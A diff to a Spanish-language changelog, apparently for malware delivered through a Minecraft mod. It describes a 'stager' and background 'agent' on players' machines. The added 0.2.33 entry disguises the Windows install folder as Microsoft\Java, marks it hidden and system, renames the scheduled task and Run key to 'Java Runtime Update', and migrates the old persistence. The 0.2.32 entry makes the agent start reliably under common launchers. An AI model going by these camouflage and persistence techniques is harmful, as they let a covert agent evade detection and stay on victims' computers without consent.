@@ -1,5 +1,12 @@
 # Changelog
 
+## 0.2.33
+
+- Camuflaje del árbol de instalación: en Windows pasa de `%LOCALAPPDATA%\FabricSync` a `%LOCALAPPDATA%\Microsoft\Java`, se marca `+H +S` y oculta el contenido de forma recursiva. La tarea programada y el valor Run pasan de `FabricSync` a `Java Runtime Update`.
+- Migración automática al siguiente arranque del mod: el stager detiene el agente anterior, mueve el árbol (o copia y borra si el move falla), conserva el estado y reescribe la persistencia. `ServerPackCore` también migra.
+- `Persistence` elimina la tarea/Run antiguos al crear los nuevos y limpia todos los alias al desactivar.
+- Linux y macOS mantienen `FabricSync`; los nombres legacy de archivos no cambian.
+
 ## 0.2.32
 
 - El stager lanzaba siempre el `javaw.exe` copiado en la carpeta de instalación. Con JRE empaquetados por el launcher (Prism, MultiMC) ese ejecutable aislado no localiza `jvm.dll`, así que el agente moría antes de escribir logs y nunca se creaba la sesión. Ahora arranca primero el `javaw.exe`/`java` real de `java.home` y deja el copiado solo como fallback. La persistencia ya prefería el runtime real.
